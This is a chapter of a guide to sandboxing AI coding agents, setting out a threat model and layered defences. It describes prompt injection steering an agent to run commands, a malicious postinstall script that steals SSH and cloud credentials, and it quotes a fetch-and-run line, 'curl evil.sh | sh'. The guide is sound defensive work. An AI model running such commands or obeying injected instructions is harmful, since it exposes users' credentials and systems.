# 02 — Why, and the threat model

## Why bother

An agent reads files, writes files, runs shell commands, installs packages, and
makes network requests. That combination is the product — and it is also the
entire threat surface.

- A hallucinated path plus `rm -rf` is your repo, or your home directory.
- A **prompt injection** — hidden instructions in a README, an issue comment, a
  webpage, a dependency's docs — can make the agent run commands you never
  asked for, with your credentials.
- A malicious `postinstall` script in a package the agent installs reads `.env`,
  `~/.ssh/id_ed25519`, `~/.aws/credentials`, and posts them somewhere.
- A loop that doesn't terminate fills your disk or forks until the machine stops
  responding.

Sandboxing is not a statement about how much you trust the model. It is a
statement about how much a mistake should cost. The goal is to make errors and
injections **cheap and reversible**: contained to a container you were going to
delete anyway, on a branch you were going to review anyway, with credentials
that expire tomorrow anyway.

## Threat model

| # | Threat | Concretely | Stopped by |
|---|---|---|---|
| 1 | Destructive filesystem operations | Agent deletes or rewrites files outside the task | [04](04-container.md) — worktree, single bind mount, read-only rootfs |
| 2 | Credential theft | Agent or a package reads `~/.ssh`, `.env`, cloud creds | [06](06-credentials.md) — nothing sensitive is ever mounted |
| 3 | Exfiltration | Stolen data leaves via `curl`, `git push`, DNS, telemetry | [05](05-egress-proxy.md) — default-deny egress allowlist |
| 4 | Prompt injection | Fetched content says "run this script" | [05](05-egress-proxy.md) + [07](07-profile.md) — no route out, plus tool-level gates |
| 5 | Resource exhaustion | Fork bomb, infinite loop, disk fill | [04](04-container.md) — cgroup limits, wall-clock kill switch |
| 6 | Persistence | Agent writes a cron job, rc file, or git hook that survives | [04](04-container.md) — read-only rootfs, tmpfs home, `--rm` |
| 7 | Lateral movement | Agent uses discovered creds to reach prod | [05](05-egress-proxy.md) + [06](06-credentials.md) — no creds, no route |
| 8 | Silent tampering | Something changes and you never notice | [05](05-egress-proxy.md) + [07](07-profile.md) — logs written *outside* the container |

## The prerequisite that voids everything else

Every layer below assumes the account launching the sandbox is unprivileged.
If it can `sudo`, an escape — or a command you paste on the agent's suggestion —
reaches root, and the rest is theatre.

Cloud images make this the default failure: `ubuntu`, `ec2-user` and
`azureuser` all ship with `NOPASSWD:ALL` in `/etc/sudoers.d/`. Run the sandbox
from a dedicated account instead, and verify rather than assume:

```bash
sudo -l -U sandboxer                                  # "not allowed to run sudo"
groups sandboxer                                      # no sudo/wheel/admin/docker
sudo grep -rn NOPASSWD /etc/sudoers /etc/sudoers.d/   # sandboxer absent
```

`./sandbox doctor` reports this, and `./sandbox go` warns before starting.

## The four rules everything else implements

1. **The agent works in a git worktree on a throwaway branch.** Never your main
   checkout. Its output arrives as a reviewable branch, and a `git reset --hard`
   inside the sandbox cannot reach your real working tree.

2. **The container is destroyed every session.** Nothing it writes outside the
   worktree survives. This is why the root filesystem is read-only and `$HOME`
   is a tmpfs — and why [the profile](07-profile.md) exists to reapply your
   configuration each time.

3. **Credentials are short-lived, single-purpose, and revoked afterwards.**
   Treat them like CI secrets, not like your personal login.

4. **Review, test, and push happen in your environment, outside the box.** The
   sandbox makes mistakes cheap; it does not make them disappear.

Rule 4 has a corollary: **the host never trusts the workspace's git config.**
`workspace/.git` is the agent's to write, and git runs a hook, a fsmonitor, a
pager or an external diff named in a repo's own config as whoever invoked it —
on the host, that is you, with your credentials. So `./sandbox review`, `push`
and `pr` override those keys on every git call, push to the remote URL recorded
at `./sandbox new` rather than the one in the workspace, and warn when the two
differ. See [10](10-push-and-pr.md).

## Defence in depth, in order of value

If you only do some of this, do it in this order:

1. **Egress control** ([05](05-egress-proxy.md)). Highest leverage by a wide
   margin. If stolen secrets cannot leave, they are not stolen; if
   `curl evil.sh | sh` cannot resolve, the injection is inert.
2. **Not mounting credentials** ([06](06-credentials.md)). Unmounted is a
   stronger guarantee than any permission rule, because it is enforced by the
   kernel rather than by a config file the agent can read.
3. **The worktree** ([04](04-container.md)). Cheap, and it converts "the agent
   edited my files" into "the agent proposed a diff".
4. **Read-only rootfs and dropped capabilities** ([04](04-container.md)).
5. **Agent-level permission rules** ([07](07-profile.md)). Catches what OS
   isolation can't: actions that are technically permitted inside the sandbox
   but aren't what you asked for.
6. **seccomp** ([04](04-container.md), on by default — it is what closes the
   same-uid `ptrace` gap that dropped capabilities leave open), then
   **gVisor** ([Part 12](../sandboxing-ai-coding-agent.md)), and rootless
   Podman ([11](11-podman.md)) ahead of both. gVisor is worth it if the agent
   routinely runs code you did not write.

Be clear-eyed about what none of it covers — see
[Part 14 of the guide](../sandboxing-ai-coding-agent.md).

Next: [03 — Prerequisites and layout](03-prerequisites-and-layout.md).
